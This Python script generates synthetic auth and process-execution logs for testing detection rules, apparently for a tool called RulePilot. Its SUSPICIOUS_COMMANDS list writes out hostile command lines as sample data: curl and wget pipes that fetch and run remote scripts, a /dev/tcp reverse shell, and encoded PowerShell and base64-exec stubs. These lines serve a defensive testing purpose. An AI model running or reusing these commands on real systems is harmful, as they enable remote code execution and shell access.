#!/usr/bin/env python3

import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path


USERS = [
    "alice",
    "bob",
    "carol",
    "dave",
    "erin",
    "frank",
    "grace",
    "heidi",
    "svc_backup",
    "svc_ci",
]

BENIGN_IPS = [
    "10.0.0.5",
    "10.0.0.8",
    "10.0.1.12",
    "10.0.2.20",
    "192.168.1.14",
    "192.168.1.19",
]

EXTERNAL_IPS = [
    "45.83.12.9",
    "91.220.101.44",
    "185.199.110.153",
    "203.0.113.77",
]

USER_AGENTS = [
    "Mozilla/5.0 Chrome/124.0",
    "Mozilla/5.0 Safari/17.0",
    "Mozilla/5.0 Firefox/126.0",
    "curl/8.1.2",
    "python-requests/2.31.0",
]

GEO_BY_IP = {
    "10.0.0.5": "internal",
    "10.0.0.8": "internal",
    "10.0.1.12": "internal",
    "10.0.2.20": "internal",
    "192.168.1.14": "internal",
    "192.168.1.19": "internal",
    "45.83.12.9": "NL",
    "91.220.101.44": "RU",
    "185.199.110.153": "US",
    "203.0.113.77": "TEST-NET",
}


def isoformat_z(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def make_event(
    ts: datetime,
    user: str,
    src_ip: str,
    status: str,
    event_type: str = "auth",
    reason: str | None = None,
) -> dict:
    event = {
        "_time": isoformat_z(ts),
        "sourcetype": "auth",
        "source": "synthetic_security_logs",
        "event_type": event_type,
        "action": "login",
        "user": user,
        "src_ip": src_ip,
        "status": status,
        "geo": GEO_BY_IP.get(src_ip, "unknown"),
        "user_agent": random.choice(USER_AGENTS),
        "app": random.choice(["vpn", "okta", "ssh", "webmail", "splunk"]),
    }

    if reason:
        event["reason"] = reason

    return event


HOSTS = [
    "host-web-01",
    "host-web-02",
    "host-app-01",
    "host-db-01",
    "host-dev-laptop-04",
    "host-dev-laptop-07",
]

PROCESS_USERS = [
    "alice",
    "bob",
    "carol",
    "dave",
    "svc_backup",
    "svc_ci",
    "svc_deploy",
]

# (process, parent_process, command_line) tuples for benign routine activity.
BENIGN_COMMANDS = [
    ("powershell.exe", "explorer.exe", "powershell.exe -Command Get-Process"),
    ("powershell.exe", "cmd.exe", "powershell.exe -File C:\\Scripts\\health_check.ps1"),
    ("curl.exe", "cmd.exe", "curl.exe -s https://api.internal/health"),
    ("curl", "bash", "curl -fsSL https://artifacts.internal/v1/manifest.json -o manifest.json"),
    ("wget", "bash", "wget https://repo.internal/pkg.tar.gz"),
    ("base64", "python3", "base64 -w0 report.txt"),
    ("openssl", "bash", "openssl rand -hex 16"),
    ("python3", "bash", "python3 /opt/jobs/nightly_etl.py --date today"),
]

# Service-account scripted workloads that include some keywords but are routine.
SERVICE_COMMANDS = [
    ("powershell.exe", "svchost.exe", "powershell.exe -File C:\\Scripts\\backup_rotate.ps1"),
    ("curl", "bash", "curl -sS https://repo.internal/index.json"),
    ("base64", "bash", "base64 /var/log/svc/audit.log"),
    ("wget", "bash", "wget -q https://artifacts.internal/build/latest.tar"),
]

# Genuinely suspicious commands the refined rule must keep catching.
SUSPICIOUS_COMMANDS = [
    (
        "powershell.exe",
        "winword.exe",
        "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIA...",
    ),
    (
        "powershell.exe",
        "outlook.exe",
        "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
    ),
    ("bash", "sshd", "curl http://45.83.12.9/p.sh | sh"),
    ("bash", "cron", "wget -qO- http://91.220.101.44/loader | bash"),
    ("bash", "httpd", "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"),
    ("python3", "bash", "python3 -c \"import base64; exec(base64.b64decode('aW1wb3J0...'))\""),
]


def make_process_event(
    ts: datetime,
    user: str,
    host: str,
    process: str,
    parent_process: str,
    command_line: str,
) -> dict:
    return {
        "_time": isoformat_z(ts),
        "sourcetype": "process",
        "source": "synthetic_security_logs",
        "event_type": "process",
        "user": user,
        "host": host,
        "process": process,
        "parent_process": parent_process,
        "command_line": command_line,
    }


def generate_events(total_events: int, seed: int) -> list[dict]:
    random.seed(seed)

    start = datetime.now(timezone.utc) - timedelta(hours=6)
    events: list[dict] = []

    # 1. Benign successful logins.
    benign_count = int(total_events * 0.70)
    for i in range(benign_count):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        user = random.choice([u for u in USERS if not u.startswith("svc_")])
        src_ip = random.choice(BENIGN_IPS)
        events.append(
            make_event(
                ts=ts,
                user=user,
                src_ip=src_ip,
                status="success",
                reason="normal_login",
            )
        )

    # 2. Isolated failed attempts.
    isolated_failures = int(total_events * 0.15)
    for i in range(isolated_failures):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        user = random.choice(USERS)
        src_ip = random.choice(BENIGN_IPS + EXTERNAL_IPS)
        events.append(
            make_event(
                ts=ts,
                user=user,
                src_ip=src_ip,
                status="failure",
                reason=random.choice(["bad_password", "expired_password", "mistyped_password"]),
            )
        )

    # 3. Service-account noise.
    service_noise = int(total_events * 0.10)
    for i in range(service_noise):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        user = random.choice(["svc_backup", "svc_ci"])
        src_ip = random.choice(BENIGN_IPS)
        status = random.choices(["success", "failure"], weights=[0.85, 0.15], k=1)[0]
        events.append(
            make_event(
                ts=ts,
                user=user,
                src_ip=src_ip,
                status=status,
                reason="service_account_activity",
            )
        )

    # 4. Suspicious sequence: repeated failures followed by success.
    suspicious_user = "alice"
    suspicious_ip = "45.83.12.9"
    attack_start = start + timedelta(hours=4, minutes=30)

    for i in range(8):
        events.append(
            make_event(
                ts=attack_start + timedelta(minutes=i * 2),
                user=suspicious_user,
                src_ip=suspicious_ip,
                status="failure",
                reason="password_spray_attempt",
            )
        )

    events.append(
        make_event(
            ts=attack_start + timedelta(minutes=18),
            user=suspicious_user,
            src_ip=suspicious_ip,
            status="success",
            reason="suspicious_success_after_failures",
        )
    )

    # 5. Another weaker suspicious-looking pattern that should not pass threshold.
    weak_user = "bob"
    weak_ip = "91.220.101.44"
    weak_start = start + timedelta(hours=5)

    for i in range(3):
        events.append(
            make_event(
                ts=weak_start + timedelta(minutes=i),
                user=weak_user,
                src_ip=weak_ip,
                status="failure",
                reason="low_volume_failed_login",
            )
        )

    # 6. Process-execution events: routine admin/dev activity.
    benign_process_count = max(int(total_events * 0.20), 30)
    for _ in range(benign_process_count):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        process, parent, cmd = random.choice(BENIGN_COMMANDS)
        user = random.choice([u for u in PROCESS_USERS if not u.startswith("svc_")])
        events.append(
            make_process_event(
                ts=ts,
                user=user,
                host=random.choice(HOSTS),
                process=process,
                parent_process=parent,
                command_line=cmd,
            )
        )

    # 7. Process-execution events: service-account scripted workloads (benign noise).
    service_process_count = max(int(total_events * 0.08), 15)
    for _ in range(service_process_count):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        process, parent, cmd = random.choice(SERVICE_COMMANDS)
        events.append(
            make_process_event(
                ts=ts,
                user=random.choice(["svc_backup", "svc_ci", "svc_deploy"]),
                host=random.choice(HOSTS),
                process=process,
                parent_process=parent,
                command_line=cmd,
            )
        )

    # 8. Process-execution events: genuinely suspicious commands the refined rule must keep.
    suspicious_process_count = max(int(total_events * 0.03), 6)
    for _ in range(suspicious_process_count):
        ts = start + timedelta(
            hours=random.randint(3, 5),
            seconds=random.randint(0, 3600),
        )
        process, parent, cmd = random.choice(SUSPICIOUS_COMMANDS)
        user = random.choice(["alice", "bob", "carol", "dave"])
        events.append(
            make_process_event(
                ts=ts,
                user=user,
                host=random.choice(HOSTS),
                process=process,
                parent_process=parent,
                command_line=cmd,
            )
        )

    # Trim or leave slightly above requested count because attack sequences are intentional.
    events.sort(key=lambda e: e["_time"])
    return events


def write_jsonl(events: list[dict], out_path: Path) -> None:
    out_path.parent.mkdir(parents=True, exist_ok=True)

    with out_path.open("w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event, sort_keys=True) + "\n")


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic auth logs for RulePilot.")
    parser.add_argument(
        "--out",
        default="../data/synthetic_security_logs.jsonl",
        help="Output JSONL path.",
    )
    parser.add_argument(
        "--events",
        type=int,
        default=500,
        help="Approximate number of events to generate.",
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=42,
        help="Random seed.",
    )

    args = parser.parse_args()

    events = generate_events(total_events=args.events, seed=args.seed)
    write_jsonl(events, Path(args.out))

    print(f"Wrote {len(events)} events to {args.out}")
    print("Known suspicious entities:")
    print("  auth: user=alice src_ip=45.83.12.9 (password spray + success)")
    print("  process: encoded PowerShell, curl|sh, /dev/tcp reverse-shell patterns")


if __name__ == "__main__":
    main()